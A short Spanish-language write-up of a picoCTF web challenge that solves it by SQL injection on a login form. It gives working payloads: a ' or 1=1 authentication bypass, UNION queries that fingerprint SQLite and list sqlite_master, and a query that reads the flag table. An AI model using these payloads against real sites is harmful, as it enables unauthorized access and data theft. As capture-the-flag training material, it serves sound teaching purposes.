## Descripción
```
Can you find the flag on this website.

Additional details will be available after launching your challenge instance.
Try to find the flag [here](http://saturn.picoctf.net:58872/)
```
## Solución
```
El sitio tiene una pantalla de inicio de sesión

Si escribe `user`su nombre de usuario y `user`contraseña, recibirá este mensaje.

Ahora vemos la consulta para la solicitud de inicio de sesión; obviamente es una pista para nosotros, porque cuando conocemos la consulta, podemos ingresar fácilmente.

`'or 1=1;--`en `pass`el campo:

Porque la consulta de resultado será algo como esto:

`SELECT id FROM users WHERE password = '' or 1=1;--' and username = '123'`

Podemos probar algunas consultas para averiguar qué base de datos se utiliza y con esta consulta:

`123' UNION SELECT 1, sqlite_version(), 3;--`

Ahora sabemos que este sitio utiliza SQLite.

Ahora podemos simplemente enumerar todas las tablas con esta consulta

`123' UNION SELECT name, sql, null from sqlite_master;--`, y listo obtenemos la bandera

Aquí está la bandera. ¡Vamos a buscarla!

`123' UNION SELECT flag, null, null from more_table;--`
```

## Notas 
```

```

## Referencias
````

```
